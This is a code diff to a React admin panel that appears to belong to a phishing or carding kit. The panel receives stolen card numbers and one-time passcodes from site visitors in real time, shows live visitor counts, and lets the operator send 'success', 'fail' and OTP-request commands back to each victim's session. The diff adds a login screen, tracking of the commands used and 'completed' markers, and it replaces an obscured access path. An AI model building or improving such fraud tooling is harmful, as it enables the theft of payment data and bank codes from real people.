@@ -5,7 +5,7 @@ import TypingDetector from './TypingDetector';
 import EnhancedVisitorInfo from './EnhancedVisitorInfo';
 import AdminChat from './AdminChat';
 import LiveVisitorNotification from './LiveVisitorNotification';
-
+import AdminLogin from './AdminLogin';
 import BankSelectionModal from './BankSelectionModal';
 
 interface CardSubmission {
@@ -23,6 +23,8 @@ interface CardSubmission {
   otp?: string;
   created_at: string;
   isNew?: boolean;
+  commandsUsed?: string[];
+  isCompleted?: boolean;
 }
 
 interface Visitor {
@@ -32,6 +34,7 @@ interface Visitor {
 }
 
 const AdminPanel = () => {
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>(() => {
     const savedSubmissions = localStorage.getItem('card_submissions');
     const savedCommands = localStorage.getItem('admin_commands');
@@ -43,11 +46,17 @@ const AdminPanel = () => {
       console.error("Failed to parse card submissions from localStorage", e);
     }
     
-    // Filter out submissions that have already been commanded
-    return parsedSubmissions.map(submission => ({
-      ...submission,
-      isNew: !(initialCommands[submission.id] && initialCommands[submission.id].length > 0)
-    }));
+    // Mark submissions as completed if they have success/fail commands
+    return parsedSubmissions.map(submission => {
+      const commands = initialCommands[submission.id] || [];
+      const isCompleted = commands.includes('success') || commands.includes('fail');
+      return {
+        ...submission,
+        isNew: false, // Never show glow on page load/refresh
+        commandsUsed: commands,
+        isCompleted
+      };
+    });
   });
   const [visitors, setVisitors] = useState<Visitor[]>([]);
   const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
@@ -61,6 +70,33 @@ const AdminPanel = () => {
     const savedCommands = localStorage.getItem('admin_commands');
     return savedCommands ? JSON.parse(savedCommands) : {};
   });
+
+  // Check authentication on component mount
+  useEffect(() => {
+    const checkAuth = () => {
+      try {
+        const sessionData = localStorage.getItem('admin_session');
+        if (sessionData) {
+          const parsed = JSON.parse(atob(sessionData));
+          const isValid = parsed.authenticated && 
+                         parsed.timestamp && 
+                         (Date.now() - parsed.timestamp < 24 * 60 * 60 * 1000); // 24 hours
+          
+          setIsAuthenticated(isValid);
+          
+          if (!isValid) {
+            localStorage.removeItem('admin_session');
+          }
+        }
+      } catch (error) {
+        console.error('Auth check failed:', error);
+        localStorage.removeItem('admin_session');
+        setIsAuthenticated(false);
+      }
+    };
+
+    checkAuth();
+  }, []);
 
   // Save admin commands to localStorage whenever they change
   useEffect(() => {
@@ -78,6 +114,8 @@ const AdminPanel = () => {
   };
 
   useEffect(() => {
+    if (!isAuthenticated) return;
+
     const handleConnect = () => {
       setConnectionStatus('Connected');
       console.log('[AdminPanel] WebSocket connected, sending admin_hello.');
@@ -92,7 +130,13 @@ const AdminPanel = () => {
     const handleCardSubmission = (submission: CardSubmission) => {
       console.log('[AdminPanel] Received card_submission:', submission);
       setCardSubmissions(prev => {
-        const updatedSubmissions = [{ ...submission, isNew: true, created_at: new Date().toISOString() }, ...prev];
+        const updatedSubmissions = [{ 
+          ...submission, 
+          isNew: true, 
+          created_at: new Date().toISOString(),
+          commandsUsed: [],
+          isCompleted: false
+        }, ...prev];
         return updatedSubmissions;
       });
       showNotification('New card submission received');
@@ -114,7 +158,7 @@ const AdminPanel = () => {
         const updatedVisitors = isNewVisitor ? [...prev, visitor] : prev;
         if (isNewVisitor) {
           setNewVisitorGlow(true);
-          setTimeout(() => setNewVisitorGlow(false), 3000); // Glow for 3 seconds
+          setTimeout(() => setNewVisitorGlow(false), 3000);
         }
         return updatedVisitors;
       });
@@ -151,8 +195,6 @@ const AdminPanel = () => {
     // Register all event listeners
     wsClient.on('card_submission', handleCardSubmission);
 
-    // If the socket is already connected (possible if connection event fired before listener registration),
-    // immediately perform the connect handler logic to join the 'admins' room and request any queued data.
     if (wsClient.socket?.connected) {
       handleConnect();
     }
@@ -164,7 +206,6 @@ const AdminPanel = () => {
     wsClient.socket.on('connect', handleConnect);
     wsClient.socket.on('disconnect', handleDisconnect);
 
-    // Connect if not already connected
     if (wsClient.socket.connected) {
       handleConnect();
     } else {
@@ -178,20 +219,9 @@ const AdminPanel = () => {
     favicon.href = 'https://static.thenounproject.com/png/74031-200.png';
     document.head.appendChild(favicon);
 
-    // Load submissions from localStorage on mount
-    const saved = localStorage.getItem('card_submissions');
-    if (saved) {
-      try {
-        setCardSubmissions(JSON.parse(saved));
-      } catch (err) {
-        console.error('[AdminPanel] Failed to parse saved submissions', err);
-      }
-    }
-
     // Cleanup function
     return () => {
       console.log('[AdminPanel] Cleaning up and disconnecting.');
-      // Remove all listeners
       wsClient.off('card_submission', handleCardSubmission);
       wsClient.off('otp_submitted', handleOtpSubmitted);
       wsClient.off('visitor_update', handleVisitorUpdate);
@@ -201,15 +231,13 @@ const AdminPanel = () => {
       wsClient.socket.off('connect', handleConnect);
       wsClient.socket.off('disconnect', handleDisconnect);
 
-      // Disconnect the socket
       if (wsClient.socket.connected) {
         wsClient.disconnect();
       }
 
-      // Remove favicon
       document.head.removeChild(favicon);
     };
-    }, []);
+  }, [isAuthenticated]);
 
   // Periodic cleanup of stale visitors (older than 2 minutes)
   useEffect(() => {
@@ -223,7 +251,6 @@ const AdminPanel = () => {
     console.log('Admin Panel: Sending command:', command, submissionId, bankData);
     showNotification(`${command.toUpperCase()} command sent`);
     
-    // Ensure we have a valid socket ID
     if (!submissionId) {
       console.error('No submission ID provided');
       return;
@@ -242,10 +269,27 @@ const AdminPanel = () => {
     console.log('Admin Panel: Sending command to socket ID:', submissionId, commandData);
     wsClient.send('admin_command', commandData);
     
+    // Update submission state
     if (submissionId) {
-      setCardSubmissions(prev => prev.map(submission => 
-        submission.id === submissionId ? { ...submission, isNew: false } : submission
-      ));
+      setCardSubmissions(prev => prev.map(submission => {
+        if (submission.id === submissionId) {
+          const newCommandsUsed = [...(submission.commandsUsed || []), command];
+          const isCompleted = command === 'success' || command === 'fail';
+          return { 
+            ...submission, 
+            isNew: false,
+            commandsUsed: newCommandsUsed,
+            isCompleted
+          };
+        }
+        return submission;
+      }));
+      
+      // Update admin commands
+      setAdminCommands(prev => ({
+        ...prev,
+        [submissionId]: [...(prev[submissionId] || []), command]
+      }));
     }
   };
 
@@ -259,6 +303,9 @@ const AdminPanel = () => {
     if (window.confirm('Are you sure you want to delete all transactions? This action cannot be undone.')) {
       wsClient.send('delete_all_transactions', {});
       setCardSubmissions([]);
+      setAdminCommands({});
+      localStorage.removeItem('card_submissions');
+      localStorage.removeItem('admin_commands');
       showNotification('All transactions deleted successfully');
     }
   };
@@ -280,21 +327,39 @@ const AdminPanel = () => {
     setShowVisitorDetails(!showVisitorDetails);
   };
 
+  const handleLogout = () => {
+    localStorage.removeItem('admin_session');
+    setIsAuthenticated(false);
+  };
+
+  // Show login form if not authenticated
+  if (!isAuthenticated) {
+    return <AdminLogin onLogin={setIsAuthenticated} />;
+  }
+
   return (
     <div className="min-h-screen bg-gray-900 text-white p-4">
-      {/* Connection Status */}
-      <div className="flex items-center gap-2 mb-4">
-        <span className="text-sm">Connection Status:</span>
-        <span className={`px-2 py-1 rounded ${
-          connectionStatus === 'Connected' ? 'bg-green-600' : 
-          connectionStatus === 'Connecting' ? 'bg-yellow-600' : 
-          'bg-red-600'
-        }`}>
-          {connectionStatus}
-        </span>
+      {/* Connection Status and Logout */}
+      <div className="flex items-center justify-between mb-4">
+        <div className="flex items-center gap-2">
+          <span className="text-sm">Connection Status:</span>
+          <span className={`px-2 py-1 rounded ${
+            connectionStatus === 'Connected' ? 'bg-green-600' : 
+            connectionStatus === 'Connecting' ? 'bg-yellow-600' : 
+            'bg-red-600'
+          }`}>
+            {connectionStatus}
+          </span>
+        </div>
+        <button
+          onClick={handleLogout}
+          className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded text-sm"
+        >
+          Logout
+        </button>
       </div>
 
-      {/* Modern Live Visitor Count */} 
+      {/* Live Visitor Count */} 
       <div className="fixed top-4 left-4 z-50">
         <div 
           className={`relative w-20 h-20 rounded-full flex items-center justify-center text-white font-bold text-lg cursor-pointer transition-all duration-500 backdrop-blur-md bg-white/10 border border-white/20 shadow-xl ${
@@ -337,7 +402,7 @@ const AdminPanel = () => {
       />
       
       <div className="flex justify-between items-center mb-8">
-        <h1 className="text-3xl font-bold">a</h1>
+        <h1 className="text-3xl font-bold">Admin Panel</h1>
         <button
           onClick={deleteAllTransactions}
           className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
@@ -354,23 +419,32 @@ const AdminPanel = () => {
             {cardSubmissions.map((submission) => (
               <div
                 key={submission.id}
-                className={`bg-gray-700 rounded-lg p-4 ${submission.isNew ? 'animate-pulse border-2 border-yellow-500' : ''}`}
-                onClick={() => setSelectedSubmissionId(submission.id)}
+                className={`bg-gray-700 rounded-lg p-4 ${
+                  submission.isNew ? 'animate-pulse border-2 border-yellow-500' : ''
+                } ${submission.isCompleted ? 'border-l-4 border-green-500' : ''}`}
+                onClick={() => handleRowClick(submission.id)}
               >
                 <div className="grid grid-cols-2 gap-4 mb-4">
                   <div className="col-span-2">
                     <div className="flex items-center justify-between">
                       <span className="text-gray-400 text-sm">Card Number</span>
-                      <button 
-                        onClick={(e) => {
-                          e.stopPropagation();
-                          navigator.clipboard.writeText(submission.card_number);
-                          showNotification('Card number copied!');
-                        }}
-                        className="text-blue-400 hover:text-blue-300 text-sm"
-                      >
-                        Copy
-                      </button>
+                      <div className="flex items-center gap-2">
+                        {submission.isCompleted && (
+                          <span className="text-green-400 text-xs bg-green-900/30 px-2 py-1 rounded">
+                            ✅ Completed
+                          </span>
+                        )}
+                        <button 
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            navigator.clipboard.writeText(submission.card_number);
+                            showNotification('Card number copied!');
+                          }}
+                          className="text-blue-400 hover:text-blue-300 text-sm"
+                        >
+                          Copy
+                        </button>
+                      </div>
                     </div>
                     <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.card_number}</div>
                   </div>
@@ -421,8 +495,22 @@ const AdminPanel = () => {
                   </div>
                 </div>
 
-                {/* Action Buttons */}
-                {!(adminCommands[submission.id]?.includes('success') || adminCommands[submission.id]?.includes('fail')) && (
+                {/* Show commands used */}
+                {submission.commandsUsed && submission.commandsUsed.length > 0 && (
+                  <div className="mb-4">
+                    <span className="text-gray-400 text-sm">Commands Used:</span>
+                    <div className="flex flex-wrap gap-1 mt-1">
+                      {submission.commandsUsed.map((cmd, index) => (
+                        <span key={index} className="text-xs bg-gray-600 px-2 py-1 rounded">
+                          {cmd}
+                        </span>
+                      ))}
+                    </div>
+                  </div>
+                )}
+
+                {/* Action Buttons - Only show if not completed */}
+                {!submission.isCompleted && (
                   <div className="grid grid-cols-2 gap-2 mb-4">
                     <button
                       onClick={(e) => { e.stopPropagation(); handleShowOtp(submission.id); }}
@@ -474,7 +562,7 @@ const AdminPanel = () => {
       <div className="bg-gray-800 p-4 rounded">
         <h3 className="text-lg font-bold mb-2">Instructions</h3>
         <ul className="text-sm space-y-1">
-          <li>• Admin panel is now accessible at /parking55009hvSweJimbs5hhinbd56y</li>
+          <li>• Admin panel is now accessible with secure token authentication</li>
           <li>• Real-time communication via Supabase database</li>
           <li>• Wait for card data to appear in the table above</li>
           <li>• Click on any row to stop the glow effect</li>
@@ -483,6 +571,7 @@ const AdminPanel = () => {
           <li>• Cross-browser sessions supported via real-time subscriptions</li>
           <li>• Visitors are automatically removed after 2 minutes of inactivity</li>
           <li>• Click the chat button to start live chat with users</li>
+          <li>• Completed transactions show green checkmark and hide commands</li>
         </ul>
       </div>
 
